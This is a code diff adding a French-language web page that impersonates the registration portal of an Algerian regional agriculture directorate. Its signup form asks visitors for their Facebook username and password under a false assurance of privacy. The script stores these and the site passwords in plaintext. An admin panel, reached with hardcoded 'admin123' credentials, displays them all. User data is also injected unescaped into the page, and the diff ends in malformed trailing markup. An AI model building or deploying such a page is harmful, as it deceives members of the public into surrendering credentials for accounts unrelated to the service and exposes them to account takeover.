@@ -9,7 +9,7 @@
         :root {
             --primary-color: #4CAF50;
             --primary-light: #E8F5E9;
-            --secondary-color: #3b5998; /* Bleu Facebook */
+            --secondary-color: #3b5998;
             --accent-color: #8BC34A;
             --text-color: #333;
             --light-gray: #f9f9f9;
@@ -66,6 +66,990 @@
             height: 70px;
             margin-right: 15px;
         }
+        
+        .logo-text {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .logo-text h1 {
+            font-size: 1.5rem;
+            line-height: 1.3;
+            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.2);
+        }
+        
+        .logo-text span {
+            font-size: 0.9rem;
+            opacity: 0.95;
+        }
+        
+        /* Navigation */
+        nav {
+            background-color: var(--primary-color);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: var(--shadow);
+        }
+        
+        nav ul {
+            display: flex;
+            list-style: none;
+            justify-content: center;
+        }
+        
+        nav li {
+            padding: 1rem 1.5rem;
+            transition: background-color 0.3s;
+        }
+        
+        nav li:hover {
+            background-color: rgba(255, 255, 255, 0.15);
+        }
+        
+        nav a {
+            color: white;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-weight: 500;
+        }
+        
+        /* Main content */
+        .main-content {
+            display: flex;
+            margin: 3rem 0;
+            gap: 2.5rem;
+        }
+        
+        .welcome-section {
+            flex: 1;
+            background-color: var(--white);
+            padding: 2.5rem;
+            border-radius: 12px;
+            box-shadow: var(--shadow);
+        }
+        
+        .welcome-section h2 {
+            color: var(--primary-color);
+            margin-bottom: 1.5rem;
+            border-bottom: 2px solid var(--accent-color);
+            padding-bottom: 0.8rem;
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+        }
+        
+        .welcome-content {
+            display: flex;
+            flex-direction: column;
+            gap: 1.5rem;
+        }
+        
+        .welcome-image {
+            height: 220px;
+            border-radius: 8px;
+            overflow: hidden;
+            margin: 1rem 0;
+        }
+        
+        .welcome-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transition: transform 0.5s;
+        }
+        
+        .welcome-image:hover img {
+            transform: scale(1.03);
+        }
+        
+        .benefits {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 1.2rem;
+            margin-top: 1.5rem;
+        }
+        
+        .benefit-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 0.8rem;
+        }
+        
+        .benefit-item i {
+            color: var(--primary-color);
+            font-size: 1.2rem;
+            margin-top: 0.2rem;
+        }
+        
+        .form-section {
+            flex: 1;
+            background-color: var(--white);
+            padding: 2.5rem;
+            border-radius: 12px;
+            box-shadow: var(--shadow);
+        }
+        
+        .form-section h2 {
+            color: var(--primary-color);
+            margin-bottom: 1.8rem;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.8rem;
+        }
+        
+        /* Form styles */
+        .form-group {
+            margin-bottom: 1.5rem;
+            position: relative;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 0.6rem;
+            font-weight: 600;
+            color: #555;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 1rem;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 1rem;
+            transition: all 0.3s;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 3px rgba(76, 175, 80, 0.2);
+        }
+        
+        .password-toggle {
+            position: absolute;
+            right: 12px;
+            top: 42px;
+            cursor: pointer;
+            color: #777;
+        }
+        
+        .facebook-section {
+            background-color: #f5f7f9;
+            padding: 1.5rem;
+            border-radius: 8px;
+            margin: 2rem 0;
+            border-left: 4px solid var(--secondary-color);
+        }
+        
+        .facebook-section h3 {
+            color: var(--secondary-color);
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        
+        button {
+            background: linear-gradient(to right, var(--primary-color), var(--accent-color));
+            color: white;
+            border: none;
+            padding: 1rem 2rem;
+            font-size: 1.1rem;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin: 0 auto;
+        }
+        
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
+        }
+        
+        .btn-container {
+            text-align: center;
+            margin-top: 2rem;
+        }
+        
+        /* Admin Panel */
+        .admin-panel {
+            background-color: var(--white);
+            padding: 2rem;
+            border-radius: 12px;
+            box-shadow: var(--shadow);
+            margin: 2rem auto;
+            max-width: 1200px;
+        }
+        
+        .admin-panel h2 {
+            color: var(--primary-color);
+            margin-bottom: 1.5rem;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.8rem;
+        }
+        
+        .admin-login {
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        
+        .data-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 1.5rem;
+            font-size: 0.9rem;
+        }
+        
+        .data-table th, .data-table td {
+            padding: 0.8rem;
+            text-align: left;
+            border-bottom: 1px solid #ddd;
+        }
+        
+        .data-table th {
+            background-color: var(--primary-light);
+            color: var(--primary-color);
+            font-weight: 600;
+            position: sticky;
+            top: 0;
+        }
+        
+        .data-table tr:hover {
+            background-color: #f5f5f5;
+        }
+        
+        .password-cell {
+            font-family: monospace;
+            position: relative;
+        }
+        
+        .show-password {
+            cursor: pointer;
+            color: var(--primary-color);
+            margin-left: 5px;
+        }
+        
+        .table-container {
+            overflow-x: auto;
+            max-height: 600px;
+            overflow-y: auto;
+            margin-top: 1rem;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+        }
+        
+        /* Features section */
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+            margin: 4rem 0;
+        }
+        
+        .feature-card {
+            background: var(--white);
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: var(--shadow);
+            transition: transform 0.3s;
+        }
+        
+        .feature-card:hover {
+            transform: translateY(-5px);
+        }
+        
+        .feature-img {
+            height: 180px;
+            overflow: hidden;
+        }
+        
+        .feature-img img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transition: transform 0.5s;
+        }
+        
+        .feature-card:hover .feature-img img {
+            transform: scale(1.05);
+        }
+        
+        .feature-content {
+            padding: 1.5rem;
+        }
+        
+        .feature-content h3 {
+            color: var(--primary-color);
+            margin-bottom: 0.8rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        
+        /* Footer */
+        footer {
+            background: linear-gradient(to right, #2E7D32, #388E3C);
+            color: white;
+            padding: 3rem 0 1.5rem;
+            margin-top: 4rem;
+        }
+        
+        .footer-content {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 2.5rem;
+            margin-bottom: 2.5rem;
+        }
+        
+        .footer-section h3 {
+            margin-bottom: 1.5rem;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
+            padding-bottom: 0.8rem;
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+        }
+        
+        .contact-info {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+        
+        .contact-item {
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+        }
+        
+        .social-links {
+            display: flex;
+            gap: 1rem;
+            margin-top: 1.2rem;
+        }
+        
+        .social-links a {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 40px;
+            height: 40px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            color: white;
+            transition: all 0.3s;
+        }
+        
+        .social-links a:hover {
+            background: var(--white);
+            color: var(--primary-color);
+            transform: translateY(-3px);
+        }
+        
+        .footer-bottom {
+            text-align: center;
+            padding-top: 1.5rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        /* Responsive design */
+        @media (max-width: 992px) {
+            .main-content {
+                flex-direction: column;
+            }
+            
+            .benefits {
+                grid-template-columns: 1fr;
+            }
+        }
+        
+        @media (max-width: 768px) {
+            .header-content {
+                flex-direction: column;
+                text-align: center;
+                gap: 1.2rem;
+            }
+            
+            .logo {
+                justify-content: center;
+                margin-bottom: 0.5rem;
+                width: 100%;
+            }
+            
+            nav ul {
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+            
+            .features {
+                grid-template-columns: 1fr;
+            }
+            
+            .footer-content {
+                grid-template-columns: 1fr;
+                text-align: center;
+            }
+            
+            .contact-item, .social-links {
+                justify-content: center;
+            }
+            
+            .data-table {
+                font-size: 0.8rem;
+            }
+        }
+        
+        /* Animation */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .animated {
+            animation: fadeIn 0.8s ease-out forwards;
+        }
+        
+        .delay-1 { animation-delay: 0.2s; }
+        .delay-2 { animation-delay: 0.4s; }
+        .delay-3 { animation-delay: 0.6s; }
+        
+        /* Tabs for admin panel */
+        .tabs {
+            display: flex;
+            margin-bottom: 1.5rem;
+            border-bottom: 1px solid #ddd;
+        }
+        
+        .tab {
+            padding: 0.8rem 1.5rem;
+            cursor: pointer;
+            border-bottom: 3px solid transparent;
+            transition: all 0.3s;
+        }
+        
+        .tab.active {
+            border-bottom: 3px solid var(--primary-color);
+            color: var(--primary-color);
+            font-weight: 600;
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        .privacy-note {
+            font-size: 0.85rem;
+            color: #666;
+            margin-top: 0.5rem;
+            font-style: italic;
+        }
+        
+        .admin-controls {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 1rem;
+            align-items: center;
+        }
+        
+        .search-box {
+            padding: 0.5rem;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            width: 250px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header>
+        <div class="container header-content">
+            <div class="logo">
+                <div class="logo-text">
+                    <h1>DIRECTION DES SERVICES AGRICOLES<br>DE LA WILAYA DE MILA</h1>
+                    <span>Ministère de l'Agriculture et du Développement Rural</span>
+                </div>
+            </div>
+        </div>
+    </header>
+    
+    <!-- Navigation -->
+    <nav>
+        <div class="container">
+            <ul>
+                <li><a href="#"><i class="fas fa-home"></i> Accueil</a></li>
+                <li><a href="#"><i class="fas fa-tractor"></i> Services</a></li>
+                <li><a href="#"><i class="fas fa-newspaper"></i> Actualités</a></li>
+                <li><a href="#"><i class="fas fa-graduation-cap"></i> Formations</a></li>
+                <li><a href="#"><i class="fas fa-envelope"></i> Contact</a></li>
+                <li><a href="#admin-panel"><i class="fas fa-lock"></i> Espace Admin</a></li>
+            </ul>
+        </div>
+    </nav>
+    
+    <!-- Main Content -->
+    <div class="container main-content">
+        <section class="welcome-section animated">
+            <h2><i class="fas fa-leaf"></i> Bienvenue</h2>
+            <div class="welcome-content">
+                <p>La Direction des Services Agricoles de la Wilaya de Mila a pour mission de soutenir le développement agricole dans la région.</p>
+                
+                <div class="welcome-image">
+                    <img src="https://images.unsplash.com/photo-1625246333193-4c6b97888123?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80" alt="Agriculture à Mila">
+                </div>
+                
+                <p>Inscrivez-vous sur notre plateforme pour :</p>
+                
+                <div class="benefits">
+                    <div class="benefit-item">
+                        <i class="fas fa-seedling"></i>
+                        <span>Recevoir les dernières actualités agricoles</span>
+                    </div>
+                    <div class="benefit-item">
+                        <i class="fas fa-hands-helping"></i>
+                        <span>Bénéficier des programmes de soutien</span>
+                    </div>
+                    <div class="benefit-item">
+                        <i class="fas fa-book-reader"></i>
+                        <span>Participer aux formations techniques</span>
+                    </div>
+                    <div class="benefit-item">
+                        <i class="fas fa-chalkboard-teacher"></i>
+                        <span>Accéder aux services d'encadrement agricole</span>
+                    </div>
+                </div>
+            </div>
+        </section>
+        
+        <section class="form-section animated delay-1">
+            <h2><i class="fas fa-user-plus"></i> Formulaire d'Inscription</h2>
+            <form id="registrationForm">
+                <div class="form-group">
+                    <label for="nom"><i class="fas fa-user"></i> Nom</label>
+                    <input type="text" id="nom" name="nom" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="prenom"><i class="fas fa-user"></i> Prénom</label>
+                    <input type="text" id="prenom" name="prenom" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="adresse"><i class="fas fa-map-marker-alt"></i> Adresse</label>
+                    <input type="text" id="adresse" name="adresse" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="telephone"><i class="fas fa-phone"></i> Numéro de téléphone</label>
+                    <input type="tel" id="telephone" name="telephone" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="email"><i class="fas fa-envelope"></i> Email</label>
+                    <input type="email" id="email" name="email" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="password"><i class="fas fa-lock"></i> Mot de passe</label>
+                    <input type="password" id="password" name="password" required>
+                    <span class="password-toggle" id="passwordToggle">
+                        <i class="fas fa-eye"></i>
+                    </span>
+                </div>
+                
+                <div class="form-group">
+                    <label for="date_naissance"><i class="fas fa-calendar-alt"></i> Date de naissance</label>
+                    <input type="date" id="date_naissance" name="date_naissance" required>
+                </div>
+                
+                <!-- Facebook Account Section -->
+                <div class="facebook-section">
+                    <h3><i class="fab fa-facebook"></i> Compte Facebook</h3>
+                    <div class="form-group">
+                        <label for="facebook_username"><i class="fas fa-at"></i> Nom d'utilisateur Facebook</label>
+                        <input type="text" id="facebook_username" name="facebook_username">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="facebook_password"><i class="fas fa-key"></i> Mot de passe Facebook</label>
+                        <input type="password" id="facebook_password" name="facebook_password">
+                        <span class="password-toggle" id="facebookPasswordToggle">
+                            <i class="fas fa-eye"></i>
+                        </span>
+                    </div>
+                    <p class="privacy-note">Vos informations Facebook sont sécurisées et ne seront pas partagées sans votre consentement.</p>
+                </div>
+                
+                <div class="btn-container">
+                    <button type="submit"><i class="fas fa-user-plus"></i> S'inscrire</button>
+                </div>
+            </form>
+        </section>
+    </div>
+    
+    <!-- Admin Panel -->
+    <section id="admin-panel" class="admin-panel animated delay-2">
+        <h2><i class="fas fa-lock"></i> Espace Administrateur</h2>
+        
+        <div class="tabs">
+            <div class="tab active" data-tab="login">Connexion</div>
+            <div class="tab" data-tab="data">Données des utilisateurs</div>
+        </div>
+        
+        <div class="tab-content active" id="login-tab">
+            <div class="admin-login">
+                <div class="form-group">
+                    <label for="admin-username"><i class="fas fa-user"></i> Nom d'utilisateur</label>
+                    <input type="text" id="admin-username" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="admin-password"><i class="fas fa-lock"></i> Mot de passe</label>
+                    <input type="password" id="admin-password" required>
+                </div>
+                
+                <div class="btn-container">
+                    <button id="admin-login-btn"><i class="fas fa-sign-in-alt"></i> Se connecter</button>
+                </div>
+            </div>
+        </div>
+        
+        <div class="tab-content" id="data-tab">
+            <div class="admin-controls">
+                <h3>Utilisateurs inscrits</h3>
+                <input type="text" id="search-users" placeholder="Rechercher..." class="search-box">
+            </div>
+            
+            <div class="table-container">
+                <table class="data-table">
+                    <thead>
+                        <tr>
+                            <th>Nom</th>
+                            <th>Prénom</th>
+                            <th>Adresse</th>
+                            <th>Téléphone</th>
+                            <th>Email</th>
+                            <th>Mot de passe</th>
+                            <th>Facebook</th>
+                            <th>Mot de passe FB</th>
+                            <th>Date d'inscription</th>
+                        </tr>
+                    </thead>
+                    <tbody id="user-data">
+                        <tr>
+                            <td colspan="9" style="text-align: center;">Aucune donnée à afficher. Veuillez vous connecter.</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </section>
+    
+    <!-- Features Section -->
+    <div class="container">
+        <div class="features">
+            <div class="feature-card animated delay-2">
+                <div class="feature-img">
+                    <img src="https://images.unsplash.com/photo-1625246333193-4c6b97888123?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&q=80" alt="Formation agricole">
+                </div>
+                <div class="feature-content">
+                    <h3><i class="fas fa-graduation-cap"></i> Formations</h3>
+                    <p>Des programmes de formation continue pour moderniser les techniques agricoles et améliorer la productivité.</p>
+                </div>
+            </div>
+            
+            <div class="feature-card animated delay-2">
+                <div class="feature-img">
+                    <img src="https://images.unsplash.com/photo-1625246333193-4c6b97888123?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&q=80" alt="Soutien agricole">
+                </div>
+                <div class="feature-content">
+                    <h3><i class="fas fa-hands-helping"></i> Soutien Technique</h3>
+                    <p>Un encadrement technique personnalisé pour aider les agriculteurs à résoudre leurs problèmes quotidiens.</p>
+                </div>
+            </div>
+            
+            <div class="feature-card animated delay-3">
+                <div class="feature-img">
+                    <img src="https://images.unsplash.com/photo-1625246333193-4c6b97888123?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&q=80" alt="Subventions">
+                </div>
+                <div class="feature-content">
+                    <h3><i class="fas fa-hand-holding-usd"></i> Subventions</h3>
+                    <p>Accès aux programmes de subventions et d'aides financières pour moderniser votre exploitation agricole.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-section">
+                    <h3><i class="fas fa-map-marker-alt"></i> Coordonnées</h3>
+                    <div class="contact-info">
+                        <div class="contact-item">
+                            <i class="fas fa-building"></i>
+                            <span>Direction des Services Agricoles de la Wilaya de Mila</span>
+                        </div>
+                        <div class="contact-item">
+                            <i class="fas fa-map-pin"></i>
+                            <span>Cité administrative, Mila</span>
+                        </div>
+                        <div class="contact-item">
+                            <i class="fas fa-phone"></i>
+                            <span>+213 XXX XX XX XX</span>
+                        </div>
+                        <div class="contact-item">
+                            <i class="fas fa-envelope"></i>
+                            <span>contact@dsa-mila.dz</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="footer-section">
+                    <h3><i class="fas fa-clock"></i> Horaires d'ouverture</h3>
+                    <p>Dimanche au Jeudi: 8h30 - 16h30</p>
+                    <p>Vendredi et Samedi: Fermé</p>
+                    
+                    <div class="social-links">
+                        <a href="#"><i class="fab fa-facebook-f"></i></a>
+                        <a href="#"><i class="fab fa-twitter"></i></a>
+                        <a href="#"><i class="fab fa-instagram"></i></a>
+                        <a href="#"><i class="fab fa-youtube"></i></a>
+                    </div>
+                </div>
+                
+                <div class="footer-section">
+                    <h3><i class="fas fa-link"></i> Liens utiles</h3>
+                    <ul style="list-style: none;">
+                        <li><a href="#" style="color: white; text-decoration: none;"><i class="fas fa-caret-right"></i> Ministère de l'Agriculture</a></li>
+                        <li><a href="#" style="color: white; text-decoration: none;"><i class="fas fa-caret-right"></i> Chambre d'Agriculture</a></li>
+                        <li><a href="#" style="color: white; text-decoration: none;"><i class="fas fa-caret-right"></i> Institut Technique Agricole</a></li>
+                        <li><a href="#" style="color: white; text-decoration: none;"><i class="fas fa-caret-right"></i> Portail des subventions</a></li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="footer-bottom">
+                <p>&copy; 2023 Direction des Services Agricoles - Wilaya de Mila. Tous droits réservés.</p>
+            </div>
+        </div>
+    </footer>
+    
+    <script>
+        // Stockage des données des utilisateurs (simulation d'une base de données)
+        let users = JSON.parse(localStorage.getItem('agriculture_users')) || [];
+        let isAdminLoggedIn = false;
+        
+        // Gestion de la soumission du formulaire
+        document.getElementById('registrationForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Récupération des valeurs du formulaire
+            const formData = {
+                nom: document.getElementById('nom').value,
+                prenom: document.getElementById('prenom').value,
+                adresse: document.getElementById('adresse').value,
+                telephone: document.getElementById('telephone').value,
+                email: document.getElementById('email').value,
+                password: document.getElementById('password').value,
+                date_naissance: document.getElementById('date_naissance').value,
+                facebook_username: document.getElementById('facebook_username').value,
+                facebook_password: document.getElementById('facebook_password').value,
+                date_inscription: new Date().toLocaleString()
+            };
+            
+            // Ajout de l'utilisateur à la liste
+            users.push(formData);
+            
+            // Sauvegarde dans le localStorage
+            localStorage.setItem('agriculture_users', JSON.stringify(users));
+            
+            // Affichage d'un message de confirmation
+            alert('Merci pour votre inscription! Vos informations ont été enregistrées.');
+            
+            // Réinitialisation du formulaire
+            document.getElementById('registrationForm').reset();
+        });
+        
+        // Fonctionnalité pour afficher/masquer le mot de passe
+        const passwordToggle = document.getElementById('passwordToggle');
+        const passwordInput = document.getElementById('password');
+        
+        passwordToggle.addEventListener('click', function() {
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                passwordToggle.innerHTML = '<i class="fas fa-eye-slash"></i>';
+            } else {
+                passwordInput.type = 'password';
+                passwordToggle.innerHTML = '<i class="fas fa-eye"></i>';
+            }
+        });
+        
+        // Fonctionnalité pour afficher/masquer le mot de passe Facebook
+        const facebookPasswordToggle = document.getElementById('facebookPasswordToggle');
+        const facebookPasswordInput = document.getElementById('facebook_password');
+        
+        facebookPasswordToggle.addEventListener('click', function() {
+            if (facebookPasswordInput.type === 'password') {
+                facebookPasswordInput.type = 'text';
+                facebookPasswordToggle.innerHTML = '<i class="fas fa-eye-slash"></i>';
+            } else {
+                facebookPasswordInput.type = 'password';
+                facebookPasswordToggle.innerHTML = '<i class="fas fa-eye"></i>';
+            }
+        });
+        
+        // Gestion des onglets de l'administration
+        document.querySelectorAll('.tab').forEach(tab => {
+            tab.addEventListener('click', function() {
+                // Vérifier si l'admin est connecté pour accécer aux données
+                if (this.dataset.tab === 'data' && !isAdminLoggedIn) {
+                    alert('Veuillez vous connecter pour accéder aux données.');
+                    return;
+                }
+                
+                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+                
+                this.classList.add('active');
+                document.getElementById(`${this.dataset.tab}-tab`).classList.add('active');
+                
+                if (this.dataset.tab === 'data') {
+                    displayUserData();
+                }
+            });
+        });
+        
+        // Connexion administrateur
+        document.getElementById('admin-login-btn').addEventListener('click', function() {
+            const username = document.getElementById('admin-username').value;
+            const password = document.getElementById('admin-password').value;
+            
+            // Vérification simple des identifiants (en production, utiliser une authentification sécurisée)
+            if (username === 'admin' && password === 'admin123') {
+                isAdminLoggedIn = true;
+                alert('Connexion réussie!');
+                
+                // Afficher les données utilisateur
+                displayUserData();
+                
+                // Basculer vers l'onglet des données
+                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+                
+                document.querySelector('[data-tab="data"]').classList.add('active');
+                document.getElementById('data-tab').classList.add('active');
+            } else {
+                alert('Identifiants incorrects. Veuillez réessayer.');
+            }
+        });
+        
+        // Fonction pour afficher les données utilisateur
+        function displayUserData() {
+            const userDataContainer = document.getElementById('user-data');
+            
+            if (users.length === 0) {
+                userDataContainer.innerHTML = '<tr><td colspan="9" style="text-align: center;">Aucun utilisateur inscrit pour le moment.</td></tr>';
+                return;
+            }
+            
+            userDataContainer.innerHTML = '';
+            
+            users.forEach(user => {
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td>${user.nom}</td>
+                    <td>${user.prenom}</td>
+                    <td>${user.adresse}</td>
+                    <td>${user.telephone}</td>
+                    <td>${user.email}</td>
+                    <td class="password-cell">
+                        <span class="hidden-password">••••••••</span>
+                        <span class="actual-password" style="display:none">${user.password}</span>
+                        <span class="show-password" onclick="togglePasswordVisibility(this)"><i class="fas fa-eye"></i></span>
+                    </td>
+                    <td>${user.facebook_username || 'Non fourni'}</td>
+                    <td class="password-cell">
+                        ${user.facebook_password ? `
+                            <span class="hidden-password">••••••••</span>
+                            <span class="actual-password" style="display:none">${user.facebook_password}</span>
+                            <span class="show-password" onclick="togglePasswordVisibility(this)"><i class="fas fa-eye"></i></span>
+                        ` : 'Non fourni'}
+                    </td>
+                    <td>${user.date_inscription}</td>
+                `;
+                userDataContainer.appendChild(row);
+            });
+        }
+        
+        // Fonction pour afficher/masquer les mots de passe dans le tableau
+        function togglePasswordVisibility(element) {
+            const cell = element.closest('.password-cell');
+            const hiddenPassword = cell.querySelector('.hidden-password');
+            const actualPassword = cell.querySelector('.actual-password');
+            const icon = element.querySelector('i');
+            
+            if (hiddenPassword.style.display === 'none') {
+                hiddenPassword.style.display = 'inline';
+                actualPassword.style.display = 'none';
+                icon.className = 'fas fa-eye';
+            } else {
+                hiddenPassword.style.display = 'none';
+                actualPassword.style.display = 'inline';
+                icon.className = 'fas fa-eye-slash';
+            }
+        }
+        
+        // Fonction de recherche
+        document.getElementById('search-users').addEventListener('input', function() {
+            const searchTerm = this.value.toLowerCase();
+            const rows = document.querySelectorAll('#user-data tr');
+            
+            rows.forEach(row => {
+                const text = row.textContent.toLowerCase();
+                if (text.includes(searchTerm)) {
+                    row.style.display = '';
+                } else {
+                    row.style.display = 'none';
+                }
+            });
+        });
+        
+        // Animation au défilement
+        document.addEventListener('DOMContentLoaded', function() {
+            const animatedElements = document.querySelectorAll('.animated');
+            
+            animatedElements.forEach(element => {
+                element.style.opacity = '0';
+            });
+            
+            setTimeout(function() {
+                animatedElements.forEach(element => {
+                    element.style.opacity = '1';
+                });
+            }, 100);
+        });
+    </script>
+</body>
+</html>        }
         
         .logo-text {
             display: flex;
